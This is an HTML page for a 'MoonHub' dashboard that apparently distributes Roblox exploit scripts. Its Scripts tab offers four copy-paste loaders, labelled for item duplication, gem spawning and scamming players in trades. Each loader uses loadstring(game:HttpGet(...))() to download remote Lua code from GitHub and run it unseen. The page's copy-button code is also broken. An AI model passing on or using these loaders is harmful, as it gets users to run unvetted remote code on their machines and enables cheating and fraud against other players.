<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoonHub Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .content {
            margin-top: 50px;
        }
        .script-container {
            margin-bottom: 20px;
        }
        .script-container textarea {
            width: 100%;
            height: 150px;
        }
        .copy-btn {
            margin-top: 10px;
        }
        .home-content {
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1 class="text-center">MoonHub</h1>

    <!-- Navbar -->
    <nav class="nav nav-pills">
        <a class="nav-link" id="home-tab" data-bs-toggle="pill" href="#home">Home</a>
        <a class="nav-link" id="scripts-tab" data-bs-toggle="pill" href="#scripts">Scripts</a>
        <a class="nav-link" id="admin-tab" href="admin.html" target="_blank">Admin Dashboard</a>
    </nav>

    <!-- Tab content -->
    <div class="tab-content content">
        <!-- Home Tab -->
        <div id="home" class="tab-pane fade show active">
            <div class="home-content">
                <h2>Welcome to MoonHub</h2>
                <p>To proceed, please go to the "Scripts" tab.</p>
            </div>
        </div>

        <!-- Scripts Tab -->
        <div id="scripts" class="tab-pane fade">
            <h2>Available Scripts</h2>

            <!-- Huge Hunt Script -->
            <div class="script-container">
                <h3>Huge Hunt Script</h3>
                <textarea readonly>
loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/huge.lua",true))()
                </textarea>
                <button class="btn btn-primary copy-btn" onclick="copyToClipboard('huge-script')">Copy Code</button>
            </div>

            <!-- Dupe Script -->
            <div class="script-container">
                <h3>Dupe Script</h3>
                <textarea readonly>
loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/Dupe.lua",true))()
                </textarea>
                <button class="btn btn-primary copy-btn" onclick="copyToClipboard('dupe-script')">Copy Code</button>
            </div>

            <!-- Gemspawner Script -->
            <div class="script-container">
                <h3>Gemspawner Script</h3>
                <textarea readonly>
loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/gem.lua",true))()
                </textarea>
                <button class="btn btn-primary copy-btn" onclick="copyToClipboard('gemspawner-script')">Copy Code</button>
            </div>

            <!-- Trade Scam Script -->
            <div class="script-container">
                <h3>Trade Scam Script</h3>
                <textarea readonly>
loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/XD/main/trd.lua",true))()
                </textarea>
                <button class="btn btn-primary copy-btn" onclick="copyToClipboard('trade-scam-script')">Copy Code</button>
            </div>
        </div>
    </div>

</div>

<script>
    // Function to copy script code to clipboard
    function copyToClipboard(scriptId) {
        var textarea = document.querySelector(`#${scriptId} textarea`);
        textarea.select();
        document.execCommand('copy');
    }
</script>

<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>

</body>
</html>
